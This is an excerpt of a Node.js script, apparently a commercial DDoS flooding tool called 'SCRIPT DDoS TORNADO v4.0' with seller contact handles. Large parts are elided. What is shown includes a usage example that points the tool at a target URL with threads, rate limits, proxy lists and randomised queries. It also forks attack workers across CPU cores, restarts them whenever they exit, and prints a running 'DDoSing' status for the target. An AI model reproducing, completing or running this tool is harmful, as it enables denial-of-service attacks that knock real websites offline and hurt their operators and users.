...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    How to use & example:
      ...
      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 32 200 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
...
if (cluster.isMaster) {
    ...
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % Math.min(os.cpus().length, 16) }));
    console.clear();
    ...
    const toolName = '🚀 SCRIPT DDoS TORNADO v4.0 🚀';
    const contact = '🆔 Telegram: @rapidreset   ☎️ Zalo: 0877667153';
...
if (cluster.isMaster) {
    setInterval(() => {
        console.log(`🚀 ĐANG DDOS ➜ ${target} | TIME: ${time}s`.rainbow);
    }, 1000);
}


    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % Math.min(os.cpus().length, 16) });
    });
